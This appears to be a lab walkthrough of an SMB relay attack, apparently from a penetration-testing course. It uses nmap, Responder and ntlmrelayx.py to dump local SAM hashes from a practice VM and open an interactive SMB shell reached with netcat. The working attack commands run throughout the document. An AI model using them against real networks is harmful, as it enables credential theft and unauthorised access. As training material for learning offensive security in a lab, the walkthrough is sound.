
First of all we need to run our nmap scan, to check for the host with **SMB** signing disabled

![](https://i.imgur.com/MlaVrME.jpg)

Now we can save  the host that have the prompt **"message signing enabled but not required"** into a **targets.txt** file

![](https://i.imgur.com/vNu7Yc1.png)

Now we can disable the **HTTP** and **SMB** protocol in the responder.conf file, located under `/etc/responder/Responder.conf`

![](https://i.imgur.com/7mRX0rr.png)

We can then startup `responder` with the syntax used previously in **LLMNR Poisoning** `sudo responder -i wlan0 -dwPv` (v for verbose)

![](https://i.imgur.com/TaJpooZ.png)

Now we can startup the `ntlmrelayx.py` tool wit these syntax `ntlmrelayx.py -tf targets.txt -smb2support` , if you don't have it, you can download it from [here](https://github.com/fortra/impacket/blob/impacket_0_9_19/examples/ntlmrelayx.py) and move it to `/usr/bin` 

> If you are still having problem with ntlmrelayx not working, you can download this [tool](https://github.com/Dewalt-arch/pimpmykali) officially made by the TCM members to fix things

![](https://i.imgur.com/Rdh5Zvu.jpg)

The next thing is for our target, to create an event (We are gonna be utilizing **THE-PUNISHER** VM) , remember the `\\ATACKER-IP`

![](https://dimitrios-tsarouchas.tech/assets/img/DNS-failure-Wrong-address.png)

**SAM hashes have been dumped**
![Local-SAM-hashes-have-been-dumped](https://dimitrios-tsarouchas.tech/assets/img/Local-SAM-hashes-have-been-dumped.png)_Local SAM hashes have been dumped_

The authentication succeeded because SMB signing is enabled but not required and because “dtsarouchas” is the Administrator on this computer. Therefore, the SAM hashes were able to be dumped. Now the attacker can copy the SAM hashes, try cracking them offline and move laterally or vertically.


The attacker now will gain access to SMB interactive shell by using the `ntlmrelayx.py -tf targets.txt -smb2support -i` command.

![Start-interactive-SMB-client-shell-via-TCP](https://dimitrios-tsarouchas.tech/assets/img/Start-interactive-SMB-client-shell-via-TCP.png)_Start interactive SMB client shell via TCP_

Now the attacker has access to the interactive shell on 127.0.0.1:11000 and will access that SMB shell using the command `nc 127.0.0.1 11000`.

![Run-netcat-to-access-the-SMB-shell](https://dimitrios-tsarouchas.tech/assets/img/Run-netcat-to-access-the-SMB-shell.png)_Run netcat to access the SMB shell_

The attacker navigates to shares where he can find ADMIN$, C$, IPC$, and Share folders. Then he uses the C$ drive and lists the files this folder has in it.

![List-the-contents-of-C$-drive](https://dimitrios-tsarouchas.tech/assets/img/List-the-contents-of-C$-drive.png)_List the contents of C$ drive_

Going a step further, he uses the ADMIN$ folder where he can add files, get files, having full control on the administrator folder and subsequently to this computer.

![Listing-the-contents-of-the-ADMIN$-folder](https://dimitrios-tsarouchas.tech/assets/img/Listing-the-contents-of-the-ADMIN$-folder.png)_Listing the contents of the ADMIN$ folder_